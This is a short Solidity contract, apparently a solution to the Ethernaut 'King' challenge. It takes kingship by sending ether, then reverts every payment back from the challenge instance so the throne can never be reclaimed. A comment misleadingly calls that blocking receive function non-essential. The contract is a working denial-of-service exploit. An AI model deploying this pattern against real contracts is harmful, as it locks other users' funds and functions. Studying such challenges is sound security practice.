// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        (bool success, ) = payable(challengeInstance).call{value: 0.001 ether}("");
        require(success, "failed");
    }

    /** 
     * This is a non-essential receive function
     */
    receive() external payable {
        require(msg.sender != challengeInstance, "no more king"); 
    }
}